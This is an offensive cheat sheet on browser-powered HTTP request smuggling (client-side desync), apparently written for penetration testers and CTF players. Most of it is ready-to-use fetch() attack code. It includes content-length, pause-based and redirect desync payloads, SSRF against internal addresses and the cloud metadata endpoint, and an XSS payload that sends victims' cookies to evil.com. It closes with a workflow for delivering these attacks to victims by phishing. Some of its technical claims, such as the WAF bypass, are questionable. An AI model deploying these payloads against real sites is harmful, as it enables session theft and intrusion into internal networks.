# HTTP Request Smuggling — Browser-Powered Attacks

---

## Quick Reference

| Attack | Trigger | Impact |
|--------|---------|--------|
| CSD — pause-based | Victim's browser pauses mid-request | Back-end sees two requests from one |
| CSD — content-length | Browser sends `Content-Length` that disagrees with body | Same desync as classic CL.TE |
| CSD via redirect | Browser follows a redirect that causes desync | Victim's follow-up request poisoned |
| Pause-based SSRF | Browser-initiated request reaches internal service | SSRF without Burp |
| XSS via CSD | Victim's browser smuggles XSS into their own session | Self-inflicted reflected XSS bypass |
| Hop-by-hop desync | `Connection: keep-alive` abuse via browser | Poisons shared back-end connection |

```
Classic smuggling:   Attacker sends a crafted request → poisons other users
Browser-powered:     Victim's OWN browser sends the crafted request → poisons themselves
                     Attacker only delivers a malicious page / URL
```

```javascript
// Core fetch-based CSD trigger (attacker's malicious page)
fetch('https://vulnerable.com/', {
    method: 'POST',
    body: 'GET /404 HTTP/1.1\r\nFoo: x',   // smuggled prefix in body
    mode: 'no-cors',
    credentials: 'include',                  // sends victim's cookies
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '34'               // disagrees with actual body length
    },
    duplex: 'half'                           // allows streaming body
}).then(() => {
    fetch('https://vulnerable.com/capture', { // follow-up poisoned request
        mode: 'no-cors',
        credentials: 'include'
    });
});
```

---

## What is Browser-Powered Request Smuggling? 🔓

Classic smuggling requires the **attacker to send** a specially crafted HTTP request directly to the server. Browser-powered attacks (also called **Client-Side Desync / CSD**) flip this model — the attacker delivers a **malicious web page** and the **victim's own browser** sends the desync payload, using the victim's own cookies and credentials.

**Impact:**
- 🔴 No proxy or Burp required — works entirely through a browser
- 🔴 Victim's cookies are automatically included — instant session context
- 🔴 Bypasses server-side IP restrictions — request comes from victim's IP
- 🔴 Works even when the attacker cannot directly reach the back-end
- ⚠️ Requires the victim to visit an attacker-controlled page (phishing / XSS delivery)

**How the attack chain works:**

```
1. Attacker hosts a malicious HTML page
2. Victim visits the page (via phishing, XSS, or open redirect)
3. Victim's browser sends a fetch() request with a desync payload
4. Back-end receives a partial or malformed request body as a new request prefix
5. Victim's own follow-up browser request gets poisoned by the prefix
6. Attacker captures the result (credentials, session, page content)
```

---

## Detecting Client-Side Desync

CSD detection differs from classic smuggling — you're testing whether the **server's response to a normal browser request** can be manipulated, not whether a proxy layer disagrees on body length.

**Step 1 — Identify endpoints that respond to browser-initiated non-standard requests:**

Look for endpoints that:
- Accept POST requests but don't actually need a body
- Return a response without consuming the body
- Trigger a redirect before reading the full body

**Step 2 — Send a probe with a body that shouldn't be there:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

If the follow-up request returns a 404 (the smuggled path) instead of the expected response → CSD confirmed ✅

**Step 3 — Test via browser fetch with `duplex: half`:**

```javascript
// Probe — if this causes the follow-up to get a 404, CSD exists
fetch('https://vulnerable.com/', {
    method: 'POST',
    body: 'GET /nonexistent HTTP/1.1\r\nFoo: x',
    headers: { 'Content-Length': '34' },
    duplex: 'half',
    mode: 'no-cors'
}).then(() => fetch('https://vulnerable.com/'));
```

**Step 4 — Check for pause-based desync:**

Some servers read the request line and headers, then pause before reading the body. If you send headers only and pause, the server may process the partial request and leave the body as a new request prefix.

```javascript
// Pause-based probe using ReadableStream
const controller = new AbortController();
fetch('https://vulnerable.com/', {
    method: 'POST',
    body: new ReadableStream({
        start(c) {
            // Enqueue headers of smuggled request, then pause
            c.enqueue(new TextEncoder().encode('GET /probe HTTP/1.1\r\nFoo: '));
            // Never call c.close() — intentional pause
        }
    }),
    duplex: 'half',
    mode: 'no-cors',
    signal: controller.signal
});
// Abort after delay, then check if /probe was processed
setTimeout(() => controller.abort(), 3000);
```

---

## CSD — Content-Length Desync

The most direct CSD technique. The browser sends a `Content-Length` that is **shorter than the actual body** — the server reads only `Content-Length` bytes and treats the rest as a new request.

**How it works:**

```
Browser sends:
POST / HTTP/1.1
Content-Length: 0          ← server reads 0 bytes of body → done
                           ← remaining body sits in buffer:
GET /admin HTTP/1.1
Host: vulnerable.com

Server processes body remainder as new request:
GET /admin HTTP/1.1        ← victim's next request gets this prepended
Host: vulnerable.com
```

**Full CL desync payload via fetch:**

```javascript
fetch('https://vulnerable.com/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '0'       // tells server: no body
    },
    body: 'GET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n',  // actual body = smuggled prefix
    duplex: 'half',
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    // Follow-up — this gets /admin prepended
    fetch('https://vulnerable.com/', { mode: 'no-cors', credentials: 'include' });
});
```

---

## CSD — Pause-Based Desync

Some servers process requests **incrementally** — they act on the request line before the body arrives. If you send headers and pause, the server may commit to processing a partial request, leaving your body as a dangling prefix.

**When this works:**
- Server uses streaming request processing
- Server responds before body is fully received (e.g. redirects, HEAD responses)
- Server has a short read timeout that fires before your body arrives

**Pause-based attack with ReadableStream:**

```javascript
function pause(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function csdPause() {
    let resolveBody;
    const body = new ReadableStream({
        start(controller) {
            resolveBody = controller;
        }
    });

    // Send request — body stream is open but paused
    const req = fetch('https://vulnerable.com/', {
        method: 'POST',
        body,
        duplex: 'half',
        mode: 'no-cors',
        credentials: 'include'
    });

    // Wait for server to start processing headers
    await pause(500);

    // Enqueue smuggled prefix into the body
    resolveBody.enqueue(new TextEncoder().encode(
        'GET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n'
    ));
    resolveBody.close();

    await req;

    // Follow-up request — gets smuggled prefix prepended
    await fetch('https://vulnerable.com/', {
        mode: 'no-cors',
        credentials: 'include'
    });
}

csdPause();
```

---

## CSD via Redirect

Some endpoints respond with a redirect (301/302) **before consuming the request body**. The browser follows the redirect — but the unconsumed body remains in the TCP connection buffer as a prefix for the next request.

**How it works:**

```
1. Browser sends POST /redirect-endpoint with body = smuggled prefix
2. Server sends 302 → /destination before reading body
3. Browser follows redirect → GET /destination
4. Server's back-end reads the leftover body as a new request
5. GET /destination gets the smuggled prefix prepended
```

**Redirect-based CSD fetch:**

```javascript
fetch('https://vulnerable.com/redirect-me', {   // endpoint that 302s without reading body
    method: 'POST',
    body: 'GET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n',
    headers: { 'Content-Length': '200' },        // larger than body → server waits, then redirects
    duplex: 'half',
    mode: 'no-cors',
    credentials: 'include',
    redirect: 'follow'
});
```

**Finding redirect endpoints:**
- Login pages that redirect on GET (but accept POST)
- `/logout`, `/session`, `/auth` endpoints
- URL normalization redirects (`/path` → `/path/`)
- HTTP → HTTPS redirects on endpoints that accept a body

---

## XSS via Client-Side Desync

Classic reflected XSS is sometimes blocked by the front-end WAF. CSD delivers the XSS payload via the victim's own browser — bypassing the WAF entirely because the browser-initiated fetch doesn't pass through the WAF inspection layer.

**Attack chain:**

```
1. Attacker hosts malicious page at evil.com
2. Victim visits evil.com (via phishing)
3. evil.com runs fetch() with XSS payload as smuggled prefix
4. Victim's next request to vulnerable.com gets XSS payload prepended
5. Back-end reflects the XSS → fires in victim's browser under vulnerable.com origin
6. Attacker's evil.com JavaScript reads document.cookie via postMessage or iframe
```

**XSS delivery via CSD:**

```javascript
// Attacker's page — victim visits this
fetch('https://vulnerable.com/', {
    method: 'POST',
    body: 'GET /?search=<script>document.location="https://evil.com/?c="+document.cookie</script> HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '0'
    },
    duplex: 'half',
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    // Trigger the poisoned request — XSS fires in victim's session
    window.location = 'https://vulnerable.com/';
});
```

---

## SSRF via Browser-Powered Smuggling

The victim's browser is inside a network boundary — their requests originate from their IP. If they're on a corporate network or VPN, CSD can reach internal services that the attacker cannot directly access.

**Internal network SSRF via CSD:**

```javascript
// Victim is on corporate network — their browser can reach 192.168.1.1
fetch('https://vulnerable.com/', {
    method: 'POST',
    body: 'GET http://192.168.1.1/admin HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n',
    headers: { 'Content-Length': '0' },
    duplex: 'half',
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    fetch('https://vulnerable.com/', { mode: 'no-cors' });
});
```

**Cloud metadata SSRF via CSD:**

```javascript
fetch('https://vulnerable.com/', {
    method: 'POST',
    body: 'GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n',
    headers: { 'Content-Length': '0' },
    duplex: 'half',
    mode: 'no-cors',
    credentials: 'include'
});
```

---

## Exploitation Workflow

1. **Find a CSD-candidate endpoint** — POST endpoints that redirect, return without reading body, or accept unexpected methods
2. **Probe with Content-Length: 0** — send a POST with CL:0 and a smuggled GET in the body; check if follow-up gets the GET prepended
3. **Test pause-based** — use `ReadableStream` to send headers, pause 500ms, then send body; check if partial request was committed
4. **Test redirect-based** — find endpoints that 302 before consuming body; send large CL with smuggled prefix as body
5. **Identify impact** — what does poisoning the victim's next request achieve? Auth bypass? XSS? SSRF?
6. **Build the malicious page** — wrap the confirmed fetch() payload in an HTML page hosted at evil.com
7. **Chain the follow-up** — after the smuggle fetch resolves, trigger the victim's poisoned request via `window.location` or a second `fetch()`
8. **Deliver to victim** — phishing link, XSS on another domain, malicious ad, open redirect
9. **Capture the result** — if XSS: `document.cookie` exfil; if SSRF: response via postMessage; if auth bypass: redirect to target page

---

## Common Vulnerable Patterns

**Server responds before consuming body (redirect):**

```python
# ❌ Vulnerable — redirects without reading request body
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return redirect('/dashboard')   # body still in TCP buffer
    # POST handler below never reached for GET
```

**Server processes request line before body arrives:**

```nginx
# ❌ Vulnerable nginx config — processes request incrementally
# Default nginx behavior: reads headers, starts proxying, reads body async
# If back-end responds before body is read → body remains as prefix
proxy_request_buffering off;           # disables full body buffering → CSD risk
```

**Connection reuse without buffer flush:**

```java
// ❌ Vulnerable — back-end reuses connection without flushing
// If previous request body was not fully consumed, it remains in stream
InputStream in = socket.getInputStream();
// Only reads Content-Length bytes — doesn't flush remaining stream data
byte[] body = in.readNBytes(contentLength);
```

**`duplex: 'half'` not blocked:**

```javascript
// ❌ Vulnerable server — does not require full body before processing
// Allows browsers to stream request bodies, enabling pause-based CSD
// Fix: require full request buffering before processing
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```javascript
// Quick CSD probe — paste in browser console on vulnerable.com
fetch('/', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    headers: { 'Content-Length': '0' },
    duplex: 'half',
    mode: 'no-cors'
}).then(() => fetch('/'));
// If second fetch() returns 404 → CSD confirmed ✅
```

**Speed tips:**
- ✅ Use **Burp HTTP Request Smuggler** extension — has a dedicated CSD scan mode
- ✅ Test from the **browser console first** — faster than setting up a full evil.com page
- ✅ `duplex: 'half'` must be supported — Chrome 105+, Firefox 110+ required
- ✅ Always include `credentials: 'include'` — without it the victim's cookies won't be sent
- ✅ For pause-based: 500ms pause is a good starting point; increase to 2000ms if server is slow
- ⚠️ CORS blocks you from **reading** the response — but the desync happens regardless of CORS
- ⚠️ `mode: 'no-cors'` is required — without it the browser won't send cross-origin requests
- ⚠️ Some browsers normalize `Content-Length` — test in Chrome; Firefox behavior may differ

**Common CTF scenarios:**
- **"Victim visits your link"** → CSD delivery model — find the desync, wrap in fetch(), deliver URL
- **"No Burp proxy available"** → browser console CSD probe is your tool
- **"Front-end WAF blocks your XSS"** → CSD bypasses WAF, delivers XSS via victim's browser
- **"App on internal network"** → SSRF via CSD using victim's browser as a pivot
- **"Login redirects immediately"** → redirect-based CSD candidate — test POST with body + CL mismatch

---

## Key Takeaways

- ✅ Browser-powered smuggling requires **no direct server access** — the victim's browser does the work
- ✅ CSD flips the threat model — attacker delivers a page, victim's browser sends the desync payload with their own cookies
- ✅ Content-Length desync is the simplest CSD: `Content-Length: 0` with a smuggled GET in the body
- ✅ Pause-based desync uses `ReadableStream` to stream the body in chunks, exploiting incremental server processing
- ✅ Redirect-based CSD targets endpoints that 302 before consuming the body — leftover body poisons the follow-up
- ✅ CORS blocks reading responses but **does not prevent** the desync from happening — the attack works regardless